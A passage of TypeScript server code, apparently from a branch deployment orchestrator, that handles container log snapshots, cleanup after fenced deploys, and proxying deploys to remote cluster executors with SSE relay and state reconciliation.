    return waitForRestartSafeBranchOperations({
      source,
      getActiveOperations: () => branchOperationCoordinator?.getActiveOperations() || [],
      serverEventLogStore,
      timeoutMs,
      intervalMs,
    });
  }

  async function captureContainerLogSnapshots(
    entry: BranchEntry,
    source: OperationLogContainerSnapshot['source'],
    profileIds?: Set<string>,
    tailLines = 500,
  ): Promise<OperationLogContainerSnapshot[]> {
    const services = Object.entries(entry.services || {})
      .filter(([profileId, svc]) => (!profileIds || profileIds.has(profileId)) && !!svc.containerName);
    const snapshots: OperationLogContainerSnapshot[] = [];

    for (const [profileId, svc] of services) {
      try {
        const raw = await containerService.getLogs(svc.containerName, tailLines);
        const maskedLogs = maskSecretsText(raw, { mask: true });
        stateService.appendContainerLogArchive(entry.id, {
          projectId: entry.projectId,
          profileId,
          containerName: svc.containerName,
          hostPort: svc.hostPort,
          status: svc.status,
          source,
          masked: true,
          logs: maskedLogs,
        });
        snapshots.push({
          profileId,
          containerName: svc.containerName,
          hostPort: svc.hostPort,
          status: svc.status,
          capturedAt: new Date().toISOString(),
          tailLines,
          source,
          logs: maskedLogs,
        });
      } catch (err) {
        snapshots.push({
          profileId,
          containerName: svc.containerName,
          hostPort: svc.hostPort,
          status: svc.status,
          capturedAt: new Date().toISOString(),
          tailLines,
          source,
          logs: '',
          message: (err as Error)?.message || String(err),
        });
      }
    }
    return snapshots;
  }

  async function cleanupFencedDeployContainers(
    entry: BranchEntry,
    profileIds: Set<string>,
    requestId: string | undefined,
    reason: string,
    operationId?: string | null,
    operationStartedAt?: string | null,
  ): Promise<void> {
    const terminalCleanupKinds = new Set<BranchOperationKind>([
      'delete',
      'stop',
      'reset',
      'cleanup-damaged',
      'cleanup-orphans',
      'factory-reset',
      'janitor-remove',
    ]);
    const branchStillExists = Boolean(stateService.getBranch(entry.id));
    const hasNewerReadyRuntime = shouldSkipFencedDeployCleanupForNewerRuntime(entry, operationStartedAt);
    if (hasNewerReadyRuntime && branchStillExists) {
      for (const profileId of profileIds) {
        const svc = entry.services?.[profileId];
        if (!svc?.containerName) continue;
        serverEventLogStore?.record({
          category: 'container',
          severity: 'info',
          source: 'deploy-fenced-cleanup',
          action: 'container.remove.after-fenced-deploy.skipped',
          message: `skipped fenced deploy cleanup because a newer runtime is already ready: ${svc.containerName}`,
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          containerName: svc.containerName,
          requestId: requestId || null,
          operationId: operationId || null,
          details: {
            reason,
            skipReason: 'newer-runtime-ready',
            operationStartedAt: operationStartedAt || null,
            lastReadyAt: entry.lastReadyAt || null,
            lastDeployAt: entry.lastDeployAt || null,
            lastStoppedAt: entry.lastStoppedAt || null,
          },
        });
      }
      return;
    }
    // R2 竞态根治（2026-06-24）：被抢占的部署在收尾失败后调本函数清容器，但若
    // **抢占它的是另一个"会产出/管理容器的操作"**（新部署 / 重启 / 自动唤醒 /
    // 强制重建等，且还没到 ready 所以 hasNewerReadyRuntime 为 false），此时删容器
    // 会把那个在途操作正在用/即将重建的容器删掉 —— 紧接着 restart/auto-wake 对已删
    // 容器 `docker restart` 就报 `No such container`，服务 0/N。
    // 解法：只要有更新的 runtime-producing 操作在跑，本次 fenced cleanup 一律跳过，
    // 把容器交给那个操作管理（它的 runService 按容器名 `docker rm -f` + create 幂等，
    // 不会泄漏）。只有"无人接管"或"终止类操作接管"时才走删除。
    const runtimeOwner = findFencedCleanupRuntimeOwner(
      branchOperationCoordinator?.getActiveOperations(entry.id) ?? [],
      operationId,
    );
    if (runtimeOwner && branchStillExists) {
      for (const profileId of profileIds) {
        const svc = entry.services?.[profileId];
        if (!svc?.containerName) continue;
        serverEventLogStore?.record({
          category: 'container',
          severity: 'info',
          source: 'deploy-fenced-cleanup',
          action: 'container.remove.after-fenced-deploy.skipped',
          message: `skipped fenced deploy cleanup because a newer runtime-producing operation will manage the container: ${svc.containerName}`,
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          containerName: svc.containerName,
          requestId: requestId || null,
          operationId: operationId || null,
          details: {
            reason,
            skipReason: 'runtime-producing-operation-active',
            runtimeOwnerOperationId: runtimeOwner.operationId || null,
            runtimeOwnerKind: runtimeOwner.kind || null,
            runtimeOwnerSource: runtimeOwner.source || null,
          },
        });
      }
      return;
    }

    const cleanupOwner = branchOperationCoordinator
      ?.getActiveOperations(entry.id)
      .find((active) => active.operationId !== operationId && terminalCleanupKinds.has(active.request.kind));

    if (cleanupOwner && branchStillExists) {
      for (const profileId of profileIds) {
        const svc = entry.services?.[profileId];
        if (!svc?.containerName) continue;
        serverEventLogStore?.record({
          category: 'container',
          severity: 'info',
          source: 'deploy-fenced-cleanup',
          action: 'container.remove.after-fenced-deploy.skipped',
          message: `skipped fenced deploy cleanup because terminal operation owns cleanup: ${svc.containerName}`,
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          containerName: svc.containerName,
          requestId: requestId || null,
          operationId: operationId || null,
          details: {
            reason,
            skipReason: branchStillExists ? 'terminal-operation-active' : 'branch-state-removed',
            cleanupOwnerOperationId: cleanupOwner?.operationId || null,
            cleanupOwnerKind: cleanupOwner?.request.kind || null,
            cleanupOwnerSource: cleanupOwner?.request.source || null,
          },
        });
      }
      return;
    }

    for (const profileId of profileIds) {
      const svc = entry.services?.[profileId];
      if (!svc?.containerName) continue;
      try {
        await containerService.remove(svc.containerName, {
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          requestId: requestId || null,
          operationId: operationId || null,
          operation: 'deploy-fenced-cleanup',
          source: 'api.deploy-fenced',
          reason,
        });
        serverEventLogStore?.record({
          category: 'container',
          severity: 'warn',
          source: 'deploy-fenced-cleanup',
          action: 'container.remove.after-fenced-deploy',
          message: `removed container after fenced deploy: ${svc.containerName}`,
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          containerName: svc.containerName,
          requestId: requestId || null,
          operationId: operationId || null,
          details: { reason },
        });
      } catch (err) {
        serverEventLogStore?.record({
          category: 'container',
          severity: 'warn',
          source: 'deploy-fenced-cleanup',
          action: 'container.remove.after-fenced-deploy.failed',
          message: `failed to remove container after fenced deploy: ${svc.containerName}`,
          projectId: entry.projectId,
          branchId: entry.id,
          profileId,
          containerName: svc.containerName,
          requestId: requestId || null,
          details: { reason },
          error: { message: (err as Error)?.message || String(err) },
        });
      }
    }
  }

  const resolveProjectIdParam = (raw: unknown): string | null => {
    if (typeof raw !== 'string' || !raw.trim()) return null;
    const project = stateService.getProject(raw.trim());
    return project?.id || raw.trim();
  };

  const gitAuthForRepo = async (repoRoot: string) => resolveGitAuthEnv({
    repoRoot,
    config,
    stateService,
    githubApp,
  });

  async function startInfraWithPortRetry(service: InfraService, projectId: string): Promise<InfraService> {
    let current = service;
    for (let attempt = 0; attempt < 5; attempt++) {
      try {
        // Phase 1: 传项目 customEnv 让 ${VAR} 展开
        await containerService.startInfraService(current, stateService.getCustomEnv(projectId));
        return current;
      } catch (err) {
        if (!isPortConflictError(err) || attempt === 4) throw err;
        const nextPort = stateService.allocatePort(config.portStart, await collectListeningPorts(shell));
        stateService.updateInfraService(current.id, { hostPort: nextPort }, projectId);
        stateService.save();
        const updated = stateService.getInfraServiceForProjectAndId(projectId, current.id);
        if (!updated) throw err;
        current = updated;
      }
    }
    return current;
  }

  // ── Cluster dispatch helper ──
  //
  // Given an incoming deploy request, decide whether it should run locally on
  // this master (returns null) or proxied to a remote executor (returns the
  // executor node). The decision order:
  //
  //   1. Request body `targetExecutorId` — explicit user choice. Must exist
  //      and be online; if missing or offline we fall back to (3).
  //   2. Branch's sticky `entry.executorId` — if this branch was previously
  //      deployed to a specific executor and that executor is still online,
  //      keep it there (deploys are idempotent on target).
  //   3. Registry's `selectExecutor(strategy)` — pick the least-loaded online
  //      executor. If the pick is the embedded master itself, return null so
  //      the existing local code path runs.
  //   4. No registry at all (standalone mode, no cluster) — return null.
  //
  // Returning null means "run locally, unchanged from before cluster".
  // Returning an ExecutorNode means "dispatch this deploy via HTTP proxy".
  function resolveDeployTarget(
    entry: BranchEntry,
    explicitTargetId: string | undefined,
  ): ExecutorNode | null {
    if (!registry) return null;

    // Explicit target wins if valid.
    if (explicitTargetId) {
      const picked = registry.getAll().find(n => n.id === explicitTargetId);
      if (picked && picked.status === 'online') {
        return picked.role === 'embedded' ? null : picked;
      }
      // Explicit but invalid → fall through to auto
    }

    // Sticky: respect previous placement if still viable.
    if (entry.executorId) {
      const sticky = registry.getAll().find(n => n.id === entry.executorId);
      if (sticky && sticky.status === 'online') {
        return sticky.role === 'embedded' ? null : sticky;
      }
      // Previously-owned executor is gone → let dispatcher re-pick
    }

    // Auto-pick via the configured strategy.
    const online = registry.getOnline();
    const remoteOnline = online.filter(n => n.role !== 'embedded');
    if (remoteOnline.length === 0) {
      // No remote executors available — run locally.
      return null;
    }
    // Use the current Dashboard strategy, defaulting to least-load which
    // is the most real-world useful (weighted memory + CPU).
    const strategy = getClusterStrategy?.() || 'least-load';
    const picked = registry.selectExecutor(strategy);
    if (!picked || picked.role === 'embedded') return null;
    return picked;
  }

  /**
   * Proxy a deploy request to a remote executor's `/exec/deploy` endpoint.
   * Streams the executor's SSE response back to the client verbatim, so the
   * dashboard's transit page and log box render exactly the same experience
   * as a local deploy. Updates the master's state so the branch shows up as
   * "hosted on" the target executor.
   *
   * Design notes:
   *  - We use global `fetch` (Node 18+) with a streaming body reader. The
   *    readable stream's chunks are raw SSE bytes; we forward them untouched
   *    so step/log/complete/error events all flow through.
   *  - We set `entry.executorId` BEFORE making the remote call so concurrent
   *    status reads see the correct ownership. If the remote call fails we
   *    leave executorId set — next deploy attempt will hit the same executor
   *    (sticky) or fall through to re-selection if it's offline.
   *  - Auth: the master sends its `X-Executor-Token` so the remote's
   *    `/exec` middleware accepts the call. This token is the shared cluster
   *    secret minted during bootstrap.
   */
  async function proxyDeployToExecutor(
    executor: ExecutorNode,
    entry: BranchEntry,
    res: import('express').Response,
    context: { requestId?: string | null; operationId?: string | null; actor?: string | null; trigger?: string | null } = {},
  ): Promise<'completed' | 'failed'> {
    // SSE headers on client side — same shape the local deploy uses so the
    // frontend doesn't need to know whether it's local or remote.
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'close',
      'X-Accel-Buffering': 'no',
    });

    // Record the ownership eagerly so GET /api/branches reflects the new
    // placement even before deploy finishes. If something goes wrong, the
    // next retry will still target this executor (sticky).
    entry.executorId = executor.id;
    entry.status = 'building';
    // 本轮构建起点锚点 —— 远端执行器路径同样要钉，否则预览等待页 ETA 会回退到
    // 历史 op-log 误算（见 BranchEntry.lastDeployStartedAt）。
    entry.lastDeployStartedAt = new Date().toISOString();
    stateService.save();

    // Tell the client we're proxying — gives the transit page a nice hint
    // and makes the log box show meaningful context on the very first event.
    const preamble = {
      step: 'dispatch',
      status: 'running',
      title: `派发到执行器 ${executor.id} (${executor.host}:${executor.port})`,
      timestamp: new Date().toISOString(),
    };
    res.write(`event: step\ndata: ${JSON.stringify(preamble)}\n\n`);

    // 用户反馈 2026-05-06 (#3):远程执行器部署的 log 一直没回流到 master,
    // GET /api/branches/:id/logs 永远空 → "部署" tab 显示 "还没有构建记录"。
    // 这里 mirror 本地部署的 OperationLog,边 pipe SSE 边累积 events,
    // proxy 结束(成功/失败)再 appendLog 到 stateService,与本地路径对齐。
    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [{ step: preamble.step, status: preamble.status, title: preamble.title, timestamp: preamble.timestamp }],
      // 2026-06-27 构建历史元数据：远端执行器路径。触发器 + commit；部署模式在
      // profiles 解析后回填（见下方）。
      triggerSource: classifyTriggerSource(context.trigger, entry.deployDispatchRetryCount),
      ...deriveCommitMeta(entry),
    };
    let proxyHasError = false;
    // 远端 error 事件携带的失败原因（executor SSE error.message），供 finally 把分支态从派发时的 building
    // 落到 error 时回填 errorMessage（Bugbot「Remote deploy error stuck building」）。
    let proxyErrorMessage: string | null = null;
    // 远端运行时就绪时刻 —— 收到成功的 complete 事件时戳。用作 opLog.runtimeStartedAt，
    // 让执行器构建路径也能像本地路径一样采集部署耗时样本（见下方 finally）。
    let remoteRuntimeReadyAt: string | null = null;

    // Prepare the payload the remote's /exec/deploy expects. The remote has
    // its own worktree + state, so we pass branch metadata + profiles + the
    // merged env var map and let it handle the rest.
    // P4 Part 17 (G2 fix): scope by the branch's project so a remote
    // executor only receives profiles owned by this project.
    // 2026-05-14 Codex review P2 "Propagate release overrides to remote
    // redeploys"：执行器侧没有 master 的 branch.profileOverrides，也不会跑
    // resolveEffectiveProfile。必须在 master 侧先 resolve，把已合并 override
    // （含 auto-publish 刚写的 release activeDeployMode）的 effective profile
    // 发过去——compute-then-send：master 算，executor 只管按收到的构建。
    // 否则 cluster 场景执行器仍按源码/热加载旧模式重建，但 master state
    // 有 override → branchAutoPublishConverged 误判收敛、不再重试，
    // auto-publish 表面成功实际没切容器。
    // 分支实际部署清单 = 项目底座 + 本分支临时额外服务(branch-local);未声明额外服务 = 项目原样。
    const profiles = stateService
      .getEffectiveProfilesForBranch(entry)
      .map((p) => resolveEffectiveProfile(p, entry));
    // 2026-06-27：回填本次（远端）部署的部署模式，供构建历史展示「部署类型」。
    opLog.deployMode = deriveDeployMode(profiles);
    const env = getMergedEnv(entry.projectId || 'default', entry.id);

    const payload = {
      branchId: entry.id,
      branchName: entry.branch,
      // 2026-04-24: thread the master's project attribution so the
      // executor stamps it on its local entry instead of falling back
      // to a hardcoded 'default'. Older executors that ignore this
      // field still resolve via resolveProjectForAutoBuild on their side.
      projectId: entry.projectId || 'default',
      profiles,
      env,
      requestId: context.requestId || null,
      operationId: context.operationId || null,
      actor: context.actor || null,
      trigger: context.trigger || 'manual',
    };

    const upstreamUrl = `http://${executor.host}:${executor.port}/exec/deploy`;
    try {
      const upstream = await fetch(upstreamUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
        },
        body: JSON.stringify(payload),
      });

      if (!upstream.ok || !upstream.body) {
        const errText = await (upstream.text ? upstream.text() : Promise.resolve('(no body)'));
        const errEvent = {
          message: `执行器拒绝部署请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
        };
        res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`);
        entry.status = 'error';
        entry.errorMessage = errEvent.message;
        proxyHasError = true;
        opLog.events.push({ step: 'error', status: 'error', title: errEvent.message, timestamp: new Date().toISOString() });
        stateService.save();
        return 'failed';
      }

      // Pipe the executor's SSE bytes directly to the client. Chunks may
      // contain partial events but SSE framing is newline-delimited so the
      // browser's EventSource parser handles boundaries correctly.
      // 同时增量解析 SSE frame 写入 opLog.events,远端执行器结束后 master
      // 的 GET /api/branches/:id/logs 也能取到完整构建历史(用户反馈 #3)。
      const reader = upstream.body.getReader();
      const decoder = new TextDecoder('utf-8');
      let buffer = '';
      // SSE 帧边界 = 双换行;parseSseFrames 取出完整帧、保留尾部不完整片段。
      const parseSseFrames = (text: string): { frames: string[]; tail: string } => {
        const out: string[] = [];
        let rest = text;
        while (true) {
          const idx = rest.indexOf('\n\n');
          if (idx === -1) break;
          out.push(rest.slice(0, idx));
          rest = rest.slice(idx + 2);
        }
        return { frames: out, tail: rest };
      };
      const ingestFrame = (frame: string): void => {
        if (!frame.trim()) return;
        let eventName = 'message';
        const dataLines: string[] = [];
        for (const line of frame.split('\n')) {
          if (line.startsWith('event:')) eventName = line.slice(6).trim();
          else if (line.startsWith('data:')) dataLines.push(line.slice(5).trim());
        }
        if (dataLines.length === 0) return;
        const dataStr = dataLines.join('\n');
        let parsed: Record<string, unknown> = {};
        try { parsed = JSON.parse(dataStr) as Record<string, unknown>; }
        catch { /* 非 JSON 数据降级为 raw chunk */ opLog.events.push({ step: eventName, status: 'log', chunk: dataStr.slice(0, 500), timestamp: new Date().toISOString() }); return; }
        if (eventName === 'error') {
          proxyHasError = true;
          if (typeof parsed.message === 'string' && parsed.message.trim() !== '') proxyErrorMessage = parsed.message;
        }
        // 2026-05-14 Codex review P2 "Don't stamp remote deploys before
        // checking service failures"：/exec/deploy 仅单服务失败时发
        // complete（services 里带 status:'error'）而**不**发 error 事件，
        // proxyHasError 一直 false → 下方把失败的 release 部署也钉成真相 +
        // 刷 lastDeployAt。complete 必须按权威 ok / services 判失败。
        if (eventName === 'complete' && parsed.ok === false) {
          proxyHasError = true;
        }
        // complete 或 error 都可能携带权威 services 快照：error 路径（如 pull 失败）此前 executor 端已按
        // payload 拆除孤儿并改了 worker state，若不把这份快照回传给 master 对账，控制面会把已移除的服务一直
        // 标 running/错端口直到下次心跳（Bugbot「Remote deploy error stale services」）。任一事件带 services 就对账。
        if ((eventName === 'complete' || eventName === 'error') && parsed.services && typeof parsed.services === 'object') {
            // executor 的 complete.services 是远端这条分支部署后的**权威全量** ServiceState 集合
            // （含 profileId/containerName/hostPort/status/deployedMode）。master 进程独立、entry.services
            // 不是同一对象，故 complete 时做一次**完整对账**（= 心跳全量同步的即时版），避免下面三类滞后：
            //   - Bugbot「Remote deploy mode metadata stale」：executor express→source 回退后的真实 deployedMode
            //   - Bugbot「Remote clear leaves master services stale」：executor 已删的服务 master 残留 ghost
            //   - Bugbot「Remote complete skips service upsert」：executor 新建、master 没有的服务漏拷 → UI
            //     显示 running 但 services 空/不全，要等下次心跳才补
            const svcMap = parsed.services as Record<string, Partial<ServiceState>>;
            if (Object.values(svcMap).some((s) => s?.status === 'error')) {
              proxyHasError = true;
            }
            // ① patch 已存在 / upsert executor-only（executor 对远端分支权威；upsert 守 containerName 存在）
            for (const [pid, s] of Object.entries(svcMap)) {
              const existing = entry.services[pid];
              if (existing) {
                // svcMap 是远端权威全量，存活行不能只同步 status/deployedMode —— containerName / hostPort /
                // errorMessage 也要按权威值覆盖（Bugbot「Remote complete skips hostPort sync」）。否则 master 仍
                // 持本地旧端口/旧容器名，预览与路由会用错端口直到下次心跳才纠偏。
                if (typeof s?.deployedMode === 'string' && s.deployedMode.trim() !== '') existing.deployedMode = s.deployedMode.trim();
                if (typeof s?.status === 'string') existing.status = s.status as ServiceState['status'];
                if (typeof s?.containerName === 'string' && s.containerName) existing.containerName = s.containerName;
                if (typeof s?.hostPort === 'number' && s.hostPort > 0) existing.hostPort = s.hostPort;
                // errorMessage：权威值有则覆盖，转为非 error 态时清掉旧错误信息（避免 running 行残留上次失败文案）。
                if (typeof s?.errorMessage === 'string' && s.errorMessage) existing.errorMessage = s.errorMessage;
                else if (s?.status && s.status !== 'error') delete existing.errorMessage;
              } else if (s && typeof s.containerName === 'string' && s.containerName) {
                entry.services[pid] = {
                  profileId: typeof s.profileId === 'string' ? s.profileId : pid,
                  containerName: s.containerName,
                  hostPort: typeof s.hostPort === 'number' ? s.hostPort : 0,
                  status: (typeof s.status === 'string' ? s.status : 'running') as ServiceState['status'],
                  ...(typeof s.deployedMode === 'string' ? { deployedMode: s.deployedMode } : {}),
                  ...(typeof s.errorMessage === 'string' && s.errorMessage ? { errorMessage: s.errorMessage } : {}),
                };
              }
            }
            // ② prune master-only（svcMap 为空=全部清掉，正是空清单清空场景；老执行器不带 services 则整段不进，不会误删）
            for (const pid of Object.keys(entry.services)) {
              if (!Object.prototype.hasOwnProperty.call(svcMap, pid)) {
                delete entry.services[pid];
              }
            }
            // ③ 重算分支态（仅 complete）：派发时钉的 building 必须按权威 svcMap 重置，否则空清空 / 全 running
            //    会一直 building 到心跳。无服务=idle、有 error=error、否则有 running=running、再否则 error；error
            //    优先于 running（running+error 混合本地 finalize 落 error，远端同口径，Bugbot「Remote deploy
            //    ignores service errors」）。error 事件不在此重算——其最终态由下方失败 finalize（proxyHasError）
            //    主导，避免把失败部署误标 idle/running。
            if (eventName === 'complete') {
              const remoteSvcStatuses = Object.values(svcMap).map((s) => s?.status);
              entry.status = remoteSvcStatuses.length === 0
                ? 'idle'
                : remoteSvcStatuses.some((s) => s === 'error') ? 'error'
                : remoteSvcStatuses.some((s) => s === 'running') ? 'running'
                : 'error';
            }
          }
          // 成功 complete = 远端运行时就绪的时刻（executor 在所有服务 running 后才发）。
          // 戳为 runtimeStartedAt，让 finally 能像本地路径一样采样部署耗时（修复 PR #865
          // Bugbot「executor deploys skip duration samples」）—— 否则执行器构建的项目
          // 永远积累不出 ETA 样本，等待页/卡片一直显示"暂无历史预计"。
          if (eventName === 'complete' && !proxyHasError) {
            remoteRuntimeReadyAt = typeof parsed.timestamp === 'string' ? parsed.timestamp : new Date().toISOString();
          }
        // 远端 source-build 执行器会自行 pull 到更新 HEAD；用回传的 pull head 刷新构建历史
        // commit 元数据（opLog.commitSha 在 2569 是按 master 冻结的旧 HEAD 捕获的），避免
        // 「版本」列指向 pull 前旧 SHA（Codex P2）。极速版锁定 CI 镜像 SHA、不跟随 pull head。
        if (parsed.step === 'pull' && !branchUsesPrebuiltMode(profiles, entry)) {
          const pullDetail = (parsed.detail && typeof parsed.detail === 'object' ? parsed.detail : parsed) as { head?: unknown; after?: unknown; afterFull?: unknown; skipped?: boolean };
          // executor 现在把结构化 head/after/afterFull 一并回传：用 parsePulledSha 取**全 SHA**
          // （afterFull > after > head token），取不到再从 title 兜底解析短 SHA。与本地 deploy 路径
          // 一致地刷新 opLog.commitSha + entry.githubCommitSha（后者被 check-run/release/集成复用，
          // 须是全 SHA），避免远端 source-build 只记短 SHA / branch HEAD 停在 master 冻结的旧 SHA
          // （Bugbot Low「Remote pull omits full SHA」）。极速版锁 CI 镜像 SHA、不跟随 pull head。
          let pulledSha = parsePulledSha({
            head: typeof pullDetail.head === 'string' ? pullDetail.head : undefined,
            after: typeof pullDetail.after === 'string' ? pullDetail.after : undefined,
            afterFull: typeof pullDetail.afterFull === 'string' ? pullDetail.afterFull : undefined,
          });
          if (!pulledSha && typeof parsed.title === 'string') {
            const m = parsed.title.match(/\b([0-9a-f]{7,40})\b/i);
            if (m) pulledSha = m[1];
          }
          if (pulledSha && !pullDetail.skipped) {
            if (shouldRefreshCommitSha(entry.githubCommitSha, pulledSha)) {
              entry.githubCommitSha = pulledSha;
            }
            Object.assign(opLog, deriveCommitMeta(entry, pulledSha));
          }
        }
        opLog.events.push({
          step: typeof parsed.step === 'string' ? parsed.step : eventName,
          status: typeof parsed.status === 'string' ? parsed.status : eventName,
          title: typeof parsed.title === 'string' ? parsed.title : (typeof parsed.message === 'string' ? parsed.message : undefined),
          detail: parsed,
          timestamp: typeof parsed.timestamp === 'string' ? parsed.timestamp : new Date().toISOString(),
        });
      };

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        buffer += chunk;
        const { frames, tail } = parseSseFrames(buffer);
        buffer = tail;
        for (const frame of frames) ingestFrame(frame);
        // Flush every complete SSE frame (terminated by blank line) so the
        // client sees updates promptly rather than waiting for the full
        // upstream response to arrive.
        try {
          res.write(chunk);
        } catch {
          // Client disconnected mid-stream — stop piping; the remote will
          // continue its build independently of this pipe going away.
          break;
        }
      }
      // If the upstream ended mid-event (rare), drain the final bytes.
      // 警告 Bugbot 2026-05-06 047481b8: 区分两种 leftover,语义不同 —
      //   1. finalChunk = decoder 内部 multi-byte 续 buf,**还没**写过客户端 → 必须 res.write
      //   2. buffer = SSE 解析器尾部不完整帧(loop 内 chunk 早就写过客户端了) → 仅需 ingestFrame 入 opLog
      // 之前用 if (buffer.trim()) 同时管两件事,finalChunk 为空但 buffer 有
      // 残留时,res.write(finalChunk) 等于 res.write('') 没意义 — 拆成两个独立 guard。
      const finalChunk = decoder.decode();
      if (finalChunk) {
        try { res.write(finalChunk); } catch { /* client gone */ }
        buffer += finalChunk;
      }
      // 警告 Bugbot 2026-05-06 6927c312:之前直接 ingestFrame(buffer) 把"多个完整
      // 帧 + 一个尾巴"当作单帧解析,后面 event: 把前面 event: 覆盖,data: 行混到
      // 一起 → opLog 里出现合并/错位事件。改:对 buffer 跑一次 parseSseFrames,
      // 完整帧逐个 ingest,只有真正不完整的尾巴才整体 ingest。
      // 警告 Bugbot 2026-05-06 18514cde:buffer 为空时跳过整个 drain,避免无谓的
      // parseSseFrames('') / ingestFrame('') 调用(虽然各自是 no-op)。
      if (buffer.length > 0) {
        const drained = parseSseFrames(buffer);
        for (const frame of drained.frames) ingestFrame(frame);
        if (drained.tail.trim()) ingestFrame(drained.tail);
      }

      // Master-side state is best-effort — the executor has the source of
      // truth via its next heartbeat, which will reconcile status.
      // 2026-05-14 真实态徽章（远端）：proxy 成功时，钉住我们**派发给
      // 执行器的已 resolve profile** 的 activeDeployMode。因为 Codex P2
      // 修复后发过去的就是 resolveEffectiveProfile 结果，executor 实际
      // 构建的就是这个模式，所以这是远端真相。失败则不动（保留旧值）。
      if (!proxyHasError) {
        for (const rp of profiles) {
          const svc = entry.services[rp.id];
          // 2026-06-24（Bugbot/Codex P2）：内嵌执行器与 master 共享同一 entry.services 对象，
          // runService 已在那上面权威钉过实际模式（含极速版→源码自动回退后的 static）。优先采纳
          // 它，仅未设时退回派发用的 rp.activeDeployMode（极速版会是 express，回退后不准）。
          // 注：远端执行器进程独立，svc 非同一对象，回退态需靠其心跳/状态回传对齐（后续）。
          if (svc) svc.deployedMode = svc.deployedMode || rp.activeDeployMode || '';
        }
        // 2026-05-14 Codex review P2 "Refresh the lifecycle clock after
        // remote redeploys"：本地部署成功会 stamp lastDeployAt（branches.ts
        // ~3651），auto-lifecycle tick 的陈旧检测靠它把 lastReadyAt 刷新到
        // 本次部署之后。远端 proxy 成功路径之前漏 stamp → 远端 auto-publish
        // 重部署后，新 release 容器仍按上一轮 source run 的旧 lastReadyAt
        // 计时，下一拍可能立刻被 auto-stop。与本地路径对齐：stamp
        // lastDeployAt，让 release run 拿到自己的完整生命周期区间。
        //
        // 但纯清空（期望清单为空、teardown-only，远端收敛后落 idle）不是一次成功部署——
        // stamp lastDeployAt / runtimeStartedAt 会把「拆服务」误当成功重部署，扰乱 auto-lifecycle
        // 陈旧检测、dispatch 对账与「最近部署」语义（Bugbot「Idle clear stamps lastDeployAt」）。
        // 故仅当确有期望部署的 profile 时才戳；profiles 为空 = 清空，跳过。
        if (profiles.length > 0) {
          stateService.stampBranchTimestamp(entry.id, 'lastDeployAt');
          // 戳远端就绪时刻，供 finally 采样部署耗时（见 remoteRuntimeReadyAt 声明处）。
          if (remoteRuntimeReadyAt) {
            opLog.runtimeStartedAt = remoteRuntimeReadyAt;
            // 与本地 finalize 对齐：确有服务 running 时刷新 entry.lastReadyAt，否则 executor-backed 分支显示
            // running 却留着上一轮的旧就绪时刻，auto-lifecycle 陈旧检测/就绪调度按错误时间算（Bugbot「Remote
            // deploy skips lastReadyAt」）。按 entry.services 实际状态判（③ 的 status 重算在 ingest 回调里，
            // 主体 TS 流分析看不到，故不用 entry.status）。
            const anyRunning = Object.values(entry.services || {}).some((s) => s.status === 'running');
            if (anyRunning) entry.lastReadyAt = remoteRuntimeReadyAt;
          }
        }
      }
      entry.lastAccessedAt = new Date().toISOString();
      stateService.save();
    } catch (err) {
      const msg = (err as Error).message;
      const errEvent = { message: `派发到执行器失败: ${msg}` };
      try { res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`); } catch { /* ignore */ }
      entry.status = 'error';
      entry.errorMessage = errEvent.message;
      proxyHasError = true;
      opLog.events.push({ step: 'error', status: 'error', title: errEvent.message, timestamp: new Date().toISOString() });
      stateService.save();
    } finally {
      // 收尾:remote 部署的 OperationLog 落库,与本地部署 (line 2724) 对齐
      opLog.finishedAt = new Date().toISOString();
      opLog.status = proxyHasError ? 'error' : 'completed';
      // 失败收尾统一兜底（两类失败都要落到「error 态 + 有顶层 errorMessage」）：
      //   1) 流式 error 事件（如孤儿拆除后 git pull 失败）：③ 仅 complete 跑，派发钉的 'building' 没人改 →
      //      卡死「构建中」（Bugbot「Remote deploy error stuck building」）。这里把 building 落 error。
      //   2) complete 但部分服务 error（无单独 error 事件）：③ 已把 entry.status 置 error，却没设顶层
      //      errorMessage → 分支显示失败但原因空，详情只散落在 entry.services（Bugbot「Remote partial
      //      failure missing errorMessage」）。这里补顶层 errorMessage。
      // errorMessage 来源优先级：executor error 事件原因 → 失败服务的 per-service 汇总 → 通用兜底。
      // catch 路径已显式置 error + errorMessage，`!entry.errorMessage` 幂等不覆盖。
      if (proxyHasError) {
        if (entry.status === 'building') entry.status = 'error';
        if (!entry.errorMessage) {
          const failedSvcMsgs = Object.values(entry.services || {})
            .filter((s) => s.status === 'error')
            .map((s) => `${s.profileId}: ${s.errorMessage || '启动失败'}`);
          entry.errorMessage = proxyErrorMessage
            || (failedSvcMsgs.length > 0 ? failedSvcMsgs.join('\n') : '')
            || '远端执行器部署失败';
        }
        stateService.save();
      }
      // 部署模式在 2593 是 build 前从全量 project profiles 取的，未必是实际跑的那个，也不含
      // executor 侧 express→static 回退。这里用服务实际 deployedMode（complete 时已钉）重算，
      // 让构建历史「部署类型」反映真正跑起来的模式；取不到（executor 没回报）则保留原值
      //（Bugbot Medium：remote deploy mode metadata stale）。
      const ranDeployMode = deriveDeployMode(
        Object.values(entry.services || {}).map((s) => ({ activeDeployMode: (s as { deployedMode?: string }).deployedMode })),
      );
      if (ranDeployMode) opLog.deployMode = ranDeployMode;
      // 与本地路径对齐：成功且有就绪时刻时采样部署耗时（recordDeployDurationSample
      // 内部已 guard status==='completed' + runtimeStartedAt 存在，失败/缺戳自动 no-op）。
      recordDeployDurationSample(stateService, entry, profiles, opLog);
      try { stateService.appendLog(entry.id, opLog); } catch { /* tolerate */ }
      try { res.end(); } catch { /* ignore */ }
    }
    return proxyHasError ? 'failed' : 'completed';
  }

  // ── Preview port servers (port mode: per-branch proxy with path-prefix routing) ──
  const previewServers = new Map<string, http.Server>();

